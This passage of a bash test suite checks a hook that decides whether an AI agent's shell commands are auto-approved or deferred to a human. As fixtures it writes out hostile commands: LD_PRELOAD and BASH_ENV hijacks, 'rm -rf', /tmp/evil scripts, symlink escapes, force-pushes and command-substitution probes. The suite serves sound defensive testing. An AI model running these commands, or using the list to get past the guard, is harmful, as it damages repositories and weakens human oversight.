assert_defer "unresolvable root arm allows nothing" "$PLUGIN_ROOT/scripts/plug.sh" Bash "$PLUGIN_CWD"
HOOK_ENV=()
assert_defer "plugin path with no root arm resolving to it" "$PLUGIN_ROOT/scripts/plug.sh" Bash "$PLUGIN_CWD"

echo "### REQ-A1.9 — grammar-conservative deferral"
assert_defer "env-assignment prefix BASH_ENV" "BASH_ENV=/tmp/x bash scripts/ok.sh"
assert_defer "env-assignment LD_PRELOAD" "LD_PRELOAD=/tmp/x cat f"
assert_defer "env-assignment GIT_PAGER" "GIT_PAGER='!cmd' git log"
assert_defer "bare env-assignment only" "FOO=bar"
assert_defer "path-prefixed verb absolute" "/tmp/evil/cat f"
assert_defer "path-prefixed verb dot-slash" "./cat f"
assert_defer "subshell grouping" "(rm -rf x)"
assert_defer "brace grouping" "{ rm -rf x; }"
assert_defer "bundled -ec" "bash -ec 'rm'"
assert_defer "here-document" "cat <<EOF
hello
EOF"
assert_defer "here-string" "cat <<< hello"
assert_defer "redirect tokenization not mis-split >|" "echo x >| stat"
assert_defer "arithmetic double-paren" "(( x = 1 ))"

echo "### REQ-A1.10 — script/test/bats path containment"
assert_defer "bash script escapes repo" "bash ../../../tmp/evil/scripts/x.sh"
assert_defer "bats path outside repo" "bats /tmp/evil.bats"
assert_defer "direct script outside repo" "/tmp/evil/scripts/x.sh"
assert_allow "in-repo subdir script still contained" "bash scripts/ok.sh"
assert_defer "symlinked script escapes repo (bash)" "bash scripts/evillink.sh"
assert_defer "symlinked script escapes repo (direct)" "scripts/evillink.sh"
assert_defer "symlinked bats escapes repo" "bats tests/evillink.bats"

echo "### REQ-A1.3 / REQ-B1.6 — deny-precedence collision (derived from worker-settings deny block)"
# Every command drawn from config/worker-settings.json's deny block MUST defer:
# the hook never auto-approves a deny-listed command. If a future allowlist
# change made one of these ALLOW, this fixture FALSE-ALLOW-fails and forces a
# human to reconcile the overlap (REQ-B1.6).
assert_defer "deny gh pr merge" "gh pr merge 5"
assert_defer "deny git merge" "git merge main"
assert_defer "deny git rebase" "git rebase main"
assert_defer "deny git commit --amend" "git commit --amend"
assert_defer "deny git reset --hard" "git reset --hard HEAD"
assert_defer "deny git filter-branch" "git filter-branch --all"
assert_defer "deny git push --force" "git push --force origin main"
assert_defer "deny git push -f after remote" "git push origin --force"
assert_defer "deny git push +refspec" "git push origin +HEAD:main"
assert_defer "deny git push --mirror" "git push --mirror"
assert_defer "deny gh pr ready --undo" "gh pr ready --undo"

echo "### REQ-B1.2 — jq extraction with degrade-to-defer"
# jq forced absent: the hook must defer everything (auto-approve nothing).
jq_absent_run() {
  local cmd="$1"
  local payload
  payload="$(jq -n --arg c "$cmd" '{tool_name:"Bash", tool_input:{command:$c}, cwd:"'"$SANDBOX"'"}')"
  # Minimal PATH with coreutils but no jq. `head` MUST be included: the hook
  # reads stdin via `head -c` (worker-command-guard.sh:1145) and defers on an
  # empty read BEFORE the jq check, so omitting `head` would make this test pass
  # by deferring on missing `head` rather than exercising the jq-absent branch.
  local restricted
  restricted="$(mktemp -d)"
  for b in bash sh cat grep sed tr printf dirname pwd env head; do
    p="$(command -v "$b" 2>/dev/null)" && ln -sf "$p" "$restricted/$b" 2>/dev/null
  done
  OUT="$(printf '%s' "$payload" | PATH="$restricted" /bin/bash "$HOOK" 2>/dev/null)"
  CODE=$?
  rm -rf "$restricted"
}
jq_absent_run "git status"
if [ "$CODE" -eq 0 ] && is_empty; then
  pass "jq-absent degrades to defer-all"
else
  if is_allow; then
    fail "jq-absent — FALSE-ALLOW: approved with jq missing"
    false_allows=$((false_allows + 1))
  else
    fail "jq-absent — expected defer (empty, exit 0), got code=$CODE"
  fi
fi

echo "### REQ-B1.3 / REQ-B1.7 — fail-safe on malformed / empty / non-string input"
malformed_run() {
  OUT="$(printf '%s' "$1" | /bin/bash "$HOOK" 2>/dev/null)"
  CODE=$?
}
malformed_run '{ this is not json'
if [ "$CODE" -eq 0 ] && is_empty; then pass "malformed JSON defers"; else fail "malformed JSON — expected defer exit 0 (got $CODE)"; fi
malformed_run ''
if [ "$CODE" -eq 0 ] && is_empty; then pass "empty stdin defers"; else fail "empty stdin — expected defer exit 0 (got $CODE)"; fi
malformed_run '{"tool_name":"Bash","tool_input":{}}'
if [ "$CODE" -eq 0 ] && is_empty; then pass "missing command field defers"; else fail "missing command — expected defer exit 0 (got $CODE)"; fi
malformed_run '{"tool_name":"Bash","tool_input":{"command":""}}'
if [ "$CODE" -eq 0 ] && is_empty; then pass "empty-string command defers"; else fail "empty command — expected defer exit 0 (got $CODE)"; fi
malformed_run '{"tool_name":"Bash","tool_input":{"command":["not","a","string"]}}'
if [ "$CODE" -eq 0 ] && is_empty; then pass "non-string command defers"; else fail "non-string command — expected defer exit 0 (got $CODE)"; fi

echo "### REQ-B1.1 — inert-data probe: analysis never executes the command"
MARKER="$SANDBOX/MARKER_SHOULD_NOT_EXIST"
rm -f "$MARKER"
run_hook "echo \$(touch $MARKER)"
if [ -e "$MARKER" ]; then
  fail "inert-data probe — analyzer EXECUTED command substitution (marker created!)"
  false_allows=$((false_allows + 1))
else
  pass "inert-data probe (dollar-paren) did not execute"
fi
rm -f "$MARKER"
run_hook "echo \`touch $MARKER\`"
if [ -e "$MARKER" ]; then
  fail "inert-data probe — analyzer EXECUTED backtick substitution (marker created!)"
  false_allows=$((false_allows + 1))
else
  pass "inert-data probe (backtick) did not execute"
fi
rm -f "$MARKER"

echo "### REQ-B1.4 — no untrusted echo; fixed reason string (no reflection)"
run_hook "git status # DISTINCTIVE_MARKER_TOKEN_XYZ"
if printf '%s' "$OUT" | grep -q "DISTINCTIVE_MARKER_TOKEN_XYZ"; then
  fail "reason reflection — command content leaked into hook output (REQ-B1.4)"
else
  pass "reason string does not reflect command content"
fi
# And even on the allow path the reason is present but fixed.
run_hook "git status"
if is_allow && printf '%s' "$OUT" | grep -Eq '"permissionDecisionReason"'; then
  pass "allow decision carries a fixed permissionDecisionReason"
else
  fail "allow decision missing permissionDecisionReason"
fi

echo "### REQ-B1.7 — bounded runtime on pathological input"
big="$(head -c 200000 /dev/zero | tr '\0' 'a')"
run_hook "echo $big"
if [ "$CODE" -eq 0 ]; then pass "pathological large input terminates with exit 0"; else fail "pathological input — exit $CODE (expected 0)"; fi
# A command past MAX_CMD_LEN (8 KiB) defers WITHOUT spending O(n^2) tokenizer
# time on it — the length cap short-circuits before tokenizing. Assert it both
# defers and returns quickly (well under the multi-second hang the high cap
# allowed).
over="$(head -c 20000 /dev/zero | tr '\0' 'a')"
# Bash's SECONDS is monotonic within the shell and needs no external `date`.
SECONDS=0
run_hook "echo $over"
elapsed=$SECONDS
if [ "$CODE" -eq 0 ] && is_empty && [ "$elapsed" -le 2 ]; then
  pass "over-cap command defers quickly (length short-circuit)"
else
  fail "over-cap command — code=$CODE empty=$(is_empty && echo y || echo n) secs=$elapsed"
fi

echo
echo "=================================================="
echo "worker-command-guard suite: $passes passed, $failures failed, false-allows: $false_allows"
echo "=================================================="
if [ "$false_allows" -gt 0 ]; then
  echo "SECURITY FAILURE: $false_allows false-allow(s) — the zero-false-allow bar is violated." >&2
fi
[ "$failures" -eq 0 ] || exit 1
exit 0
